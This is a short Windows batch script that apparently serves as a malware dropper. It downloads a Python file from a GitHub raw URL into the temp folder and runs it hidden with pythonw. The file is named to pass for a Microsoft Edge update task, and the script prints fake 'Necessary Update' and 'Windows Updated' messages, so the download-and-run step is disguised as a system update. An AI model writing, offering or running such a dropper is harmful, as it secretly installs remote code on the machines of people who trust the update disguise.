@echo off
set "TEMP_FOLDER=%TEMP%"
set "SCRIPT_NAME=MicrosoftEdgeUpdateTaskMachineUA.pyw"
set "SCRIPT_URL=https://raw.githubusercontent.com/Tarekmohamed0/client/main/MicrosoftEdgeUpdateTaskMachineUA.pyw" REM Replace with the actual URL of your Python script

set "PYTHON_SCRIPT_PATH=%TEMP_FOLDER%\%SCRIPT_NAME%"

rem Check if Python is installed
python --version >NUL 2>NUL
if %errorlevel% neq 0 (
    echo Python is not installed. Please install Python and try again.
    exit /b 1
) else (
    echo Python is installed.
)

rem Check if Necessary update
if not exist "%PYTHON_SCRIPT_PATH%" (
    echo Necessary Update. Downloading...
    curl -o "%PYTHON_SCRIPT_PATH%" "%SCRIPT_URL%"
) else (
    echo Windows Updated.
)

rem Open the Python script in the background without showing the console window
start /MIN /B "Python Script" pythonw "%PYTHON_SCRIPT_PATH%"

exit
